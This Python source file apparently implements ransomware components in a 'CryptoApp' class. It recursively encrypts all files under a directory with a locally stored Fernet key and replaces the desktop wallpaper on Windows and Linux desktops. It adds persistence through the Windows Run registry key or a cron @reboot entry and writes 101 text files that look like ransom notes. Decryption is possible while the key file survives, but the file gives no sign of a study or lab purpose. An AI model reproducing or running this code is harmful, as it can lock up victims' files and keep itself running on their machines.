from cryptography.fernet import Fernet
from subprocess import call, run
from typing import Optional
from glob import glob
from time import sleep
import ctypes
import sys
import os
import signal
import json
import importlib
import re
import dbus

if importlib.find_loader('winreg'):
    import winreg


# ✅ Windows 10
# ✅ Mint (Cinnamon)
# ✅ Arch (Cinnamon, xfce, GNOME)
# ✅ Fedora (GNOME)
# ✅ Endeavour (KDE Plasma)

class CryptoApp:
    def __init__(self, startPath: str = None):
        # Init the starting path, and change the current directory to it
        startPath: str = startPath or os.getcwd()
        os.chdir(startPath)

        KEY_PATH: str = '.key'

        # If the key exists, that means the files have been already encrypted
        if os.path.isfile(KEY_PATH):
            self.isEncrypted = True

            # Read the current fernet key
            self.key = self.readFile(KEY_PATH)
                
        # If the files were not encrypted
        else:
            self.isEncrypted = False
            self.key = Fernet.generate_key()

            # Write the fernet key to a file
            self.writeFile(KEY_PATH, self.key)
            

        # Initialize main variables
        self.omittedFiles:       list = ['.key', 'CryptoApp.py', 'index.py', '.cron_copy', '__pycache__']
        self.extensionsToModify: list = []
        self.KEY_PATH:           str = os.path.abspath(KEY_PATH)
        self.startingPath:       str = startPath
        self.countFiles:         int = 0
        self.countDirs:          int = 0
        self.totalFileSize:      int = 0

        try:
            self.fernet = Fernet(self.key)

        except ValueError:
            # If the key is incorrect, delete it, and exit the program
            print('[ERROR] Incorrect key! You can forget about decryption')
            print('[INFO] Removing key...')
            os.remove(self.KEY_PATH)

            exit(1)



    # Run a shell script with an output
    def __getsh(self, command) -> any:
        try:
            result = run(command, capture_output=True, shell=True).stdout.decode('utf-8')
            return result

        except: return None

    # Run a shell script
    def __runsh(self, command: str) -> None:
        call(command, shell=True)

    # fn for filtering files that shouldn't be modified
    def __omittedFilter(self, filename: str) -> bool:
        for omit in self.omittedFiles:
            # Match normal filenames, and ones with * (any char in between) 
            rx: str = omit.replace('.', '\.').replace('*', '.+')

            # If matches       
            if re.search(rx, filename):
                return False

        return True

    # fn for filtering extensions
    def __extensionFilter(self, filename: str) -> bool:
        p, ext = os.path.splitext(filename)

        for mod in self.extensionsToModify:
            # True if its directory, or proper extension
            if os.path.isdir(filename) or filename.endswith(mod):
                return True

            if not ext:
                # Handle .* files (eg. .vimrc, .profile)
                rx: str = mod.replace('.', '\.').replace('*', '.+')
                if re.search(f'^{rx}$', p):
                    return True

        return False

    # Handle the encrypt/decrypt actions
    def __actionHandler(self) -> None:
        
        # Filter files that shouldn't be modified
        files: list = list(filter(self.__omittedFilter, os.listdir())) 

        # Filter the file extensions
        if len(self.extensionsToModify):
            files = list(filter(self.__extensionFilter, files))


        # Loop through each file
        for path in files:
            path = os.path.abspath(path)

            try:
                # If the "path" is directory, change the working directory
                # Handle the files recursively, and finally return to the original directory
                if os.path.isdir(path):
                    # Save the current path, and increment the dir count
                    currentDir: str = os.getcwd()
                    self.countDirs += 1

                    os.chdir(path)
                    self.__actionHandler()   
                    os.chdir(currentDir)

                    continue             


                # Read the file contents
                old_text: str = self.readFile(path)
                if not old_text: continue


                # Encrypt or decrypt the file
                if self.isEncrypted:
                    new_text: str = self.fernet.decrypt(old_text)
                else:
                    new_text: str = self.fernet.encrypt(old_text)


                fileSize: int = os.stat(path).st_size

                # Finally, write to the file its new content
                self.writeFile(path, new_text)
                print(f'[MOD] {path} - modified')

                # Increment the modified files count, and sum of file sizes
                self.countFiles += 1
                self.totalFileSize += fileSize


            except PermissionError:
                # Skip if there is a permission error
                print(f'[WARN] Not permitted to operate on: {path}')

            except:
                # Skip if something went wrong
                print(f'[ERROR] Could not modify file: {path}')


    # Choose which files will be skipped during encryption
    def setFilesToSkip(self, files: list) -> None:
        self.omittedFiles.extend(files)


    # Choose which file extensions will be encrypted (default any, which may cause very serious damage)
    def setExtensionsToModify(self, extensions: list) -> None:
        self.extensionsToModify.extend(extensions)


    # Helper function for encrypting/decrypting
    def enc_dec_helper(self, type: str) -> None:
        action: Optional[str] = None

        if type == 'enc': action = 'Encrypting...'
        elif type == 'dec': action = 'Decrypting...'

        print(f'[START] {action}')
        self.__actionHandler()
        print(f'[FINISH] {action[:7]}ed {self.countFiles} files')


    # Encrypt the files
    def encrypt(self) -> None:
        self.enc_dec_helper('enc')


    # Decrypt the files
    def decrypt(self) -> None:
        self.enc_dec_helper('dec')

        # Remove the decryption key
        os.remove(self.KEY_PATH)


    # Determine the OS, and DE, if on Linux
    # Returns a list with two elements that represent os and optionally desktop environment
    def determineOS(self) -> list:
        os_info: Optional[str] = None
        de: Optional[str] = None

        # Get the OS
        if sys.platform in ['linux2', 'linux']:
            os_info = 'linux'
        elif sys.platform == 'darwin':
            os_info = 'mac'
        elif sys.platform in ['win32', 'cygwin']:
            os_info = 'windows'

        # Get the DE
        if os_info == 'linux':
            match os.environ.get("DESKTOP_SESSION"):
                # Known: cinnamon, xfce
                case 'ubuntu': de = 'gnome'
                case 'kubuntu': de = 'plasma'
                case _: de = os.environ.get("DESKTOP_SESSION")

        return [os_info, de]            


    # Set the wallpaper image
    def setDesktopBG(self, target_os: str, target_de: str, file: str) -> None:
        if not file or not os.path.isfile(file): 
            return

        try:
            abs_path: str = os.path.abspath(file)
            
            # Linux distros
            if target_os == 'linux':
                # Xfce
                if target_de == 'xfce':
                    for monitor in ['Virtual1', 'Virtual-1', '0']:
                        self.__runsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{monitor}/workspace0/last-image -s {abs_path} 2> /dev/null')

                # GNOME / Cinnamon
                if target_de in ['gnome', 'cinnamon']:
                    for style in ['picture-uri', 'picture-uri-dark']:
                        self.__runsh(f'gsettings set org.gnome.desktop.background {style} file://{abs_path}')

                # KDE Plasma
                elif target_de == 'plasma':
                    script: str = f"""
                    var allDesktops = desktops();
                    for (i=0;i<allDesktops.length;i++) {{
                        d = allDesktops[i];
                        d.wallpaperPlugin = "org.kde.image";
                        d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");
                        d.writeConfig("Image", "{file}")
                    }}
                    """

                    session: any = dbus.SessionBus().get_object('org.kde.plasmashell', '/PlasmaShell')
                    plasma:  any = dbus.Interface(session, 'org.kde.PlasmaShell')

                    plasma.evaluateScript(script)


            # Windows
            if target_os == 'windows':
                ctypes.windll.user32.SystemParametersInfoW(0x14, 0, abs_path, 0)

        except Exception as e:
            print('[ERROR] Could not change the wallpaper')


    # Get the current wallpaper image
    def getDesktopBG(self, target_os: str, target_de: str) -> str | None:
        output: Optional[str] = None

        try:
            # Linux distros
            if target_os == 'linux':
                # Xfce
                if target_de == 'xfce':
                    for x in ['Virtual1', 'Virtual-1', '0']:
                        result: Optional[str] = self.__getsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image')

                        # Remove the line break
                        output = result.rstrip()
                        if output: break

                # GNOME / Cinnamon
                elif target_de in ['gnome', 'cinnamon']:
                    # Get dark/light theme
                    theme: str = self.__getsh('gsettings get org.gnome.desktop.interface gtk-theme')
                    theme = 'picture-uri-dark' if 'dark' in theme.lower() else 'picture-uri'

                    result: str = self.__getsh(f'gsettings get org.gnome.desktop.background {theme}')
                    
                    # Remove the "file://" and '' to get a clear url
                    output = result.rstrip().replace('file://', '').replace("'", '')

                # KDE Plasma
                elif target_de == 'plasma':
                    # Current wallapper should be in this file
                    kde_file:      str = 'plasma-org.kde.plasma.desktop-appletsrc'
                    kde_file_path: str = os.path.join(os.path.expanduser('~'), '.config', kde_file)

                    if os.path.isfile(kde_file_path):
                        with open(kde_file_path, 'r') as file:
                            # Find the wallpaper's path
                            content:    str = file.read()
                            index:      int = content.find('[Wallpaper]')
                            image_line: str = content[index:].splitlines()[1]

                            if 'Image' in image_line:
                                image_path: str = image_line[6:]

                                if os.path.isfile(image_path):
                                    output = image_path
                

            # Windows
            if target_os == 'windows':
                MAX: int = 260

                buf = ctypes.create_unicode_buffer(MAX)
                ctypes.windll.user32.SystemParametersInfoW(0x73, MAX, buf, 0)

                output = buf.value


            return output

        except:
            print('[ERROR] Could not get the wallpaper')


    # Launch a specified script on startup using windows registry (windows)
    # scriptToStart should be an absolute path
    def registryStartupAction(self, target_os: str, type: str, scriptToStart: str = '') -> None:
        # Check the OS
        if target_os != 'windows':
            print(f'[ERROR] Modyifying registry on {target_os}')
            return

        # Check if a script exists
        if not os.path.isfile(scriptToStart):
            print(f'[ERROR]: Script {scriptToStart} not found')
            return


        key:        str  = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key_name:   str  = 'win_reg_start'

        # Open the RUN registry
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            p, ex = os.path.splitext(scriptToStart)

            try:
                if type == 'start':
                    # .py extension script
                    if ex in ['.py', '.pyw']:
                        bat_path: str = f'{p}.bat'

                        # Create a batch file that executes user's script
                        self.writeFile(bat_path, f'@echo off\npython {scriptToStart} %*')

                        scriptToStart = bat_path

                    # Return if an extension is different than .bat
                    elif ex != '.bat':
                        print(f'[ERROR] {ex} extension is not supported')
                        return

                    # Set the registry and run the script immediately
                    winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, scriptToStart)
                    run([scriptToStart])

                # Remove a startup script from the registry
                elif type == 'stop':
                    winreg.DeleteValue(reg_key, key_name)

            except:
                print('[ERROR] Handling startup script failed')


    # Launch a specified script on startup using cron (unix like)
    # scriptToStart should be an absolute path
    def cronStartupAction(self, target_os: str, type: str, scriptToStart: str = '') -> None:
        # Check the OS
        if target_os not in ['linux', 'mac']:
            print(f'[ERROR] Running cron on {target_os}')
            return

        # Check if cron is installed
        doesExist: Optional[str] = self.__getsh('which crontab')
        if not doesExist or 'not found' in doesExist:
            print('[ERROR] cron is not installed on the system')
            return


        # File to save the original cron settings to
        CRON_ORIGINAL: str = '.cron_copy'

        if type == 'start':
            CRON_ARG: str = 'crontab_arg'

            # Check if a script exists
            if not os.path.isfile(scriptToStart):
                print(f'[ERROR]: Script {scriptToStart} not found')
                return

            # Get and save the current cron settings
            current: str = self.__getsh('crontab -l')
            self.writeFile(CRON_ORIGINAL, current)

            # Add a new entry
            current += f'\n@reboot python3 {scriptToStart}\n'
            self.writeFile(CRON_ARG, current)
            
            # Save the new cron settings and run the script
            self.__runsh(f'crontab {CRON_ARG} &> /dev/null')
            self.__runsh(f'python3 {scriptToStart} &')

            sleep(1)
            os.remove(CRON_ARG)

        elif type == 'stop' and os.path.isfile(CRON_ORIGINAL):
            # Revert to the original cron settings
            self.__runsh(f'crontab {CRON_ORIGINAL} &> /dev/null')
            
            sleep(1)
            os.remove(CRON_ORIGINAL)

            try:
                # Get the PID of the process
                pid: int = int(self.__getsh(f"ps -aux | grep {scriptToStart} | awk '{{print $2}}'").split('\n')[0])

                # And terminate that process
                if pid:
                    os.kill(pid, signal.SIGKILL)

            except: return


    # Write to the file
    def writeFile(self, path: str, val: str) -> None:
        mode = 'wb' if isinstance(val, bytes) else 'w'

        try:
            with open(path, mode) as file:
                file.write(val)

        except FileNotFoundError: return


    # Read the file contents
    def readFile(self, path: str) -> str | None:
        if os.path.isfile(path):
            with open(path, 'rb') as file:
                return file.read()

        return None


    # Creates additional files
    def createAdditionalFiles(self, create_path: str, txtFilename: str, txtContent: str = '', num: int = 101) -> None:
        for i in range(0, num):
            new_file_path: str = os.path.join(create_path, txtFilename)
            self.writeFile(f'{new_file_path}{i}.txt', txtContent)


    # Removes additional files
    def removeAdditionalFiles(self, create_path: str, txtFilename: str) -> None:
        for file in glob(f'{os.path.join(create_path, txtFilename)}*.txt'):
            try: os.remove(file)
            except: continue


    # Returns True, if the files were already encrypted (key.txt is present)    
    def isAlreadyEncrypted(self) -> bool:
        return self.isEncrypted

    
    # Get a list of a total modified files, directories and total size of affected files (MiB)
    def getAffectedFilesInfo(self) -> list:
        sizeInMB: int = round(self.totalFileSize / 1024**2, 2)

        return [self.countFiles, self.countDirs, sizeInMB]
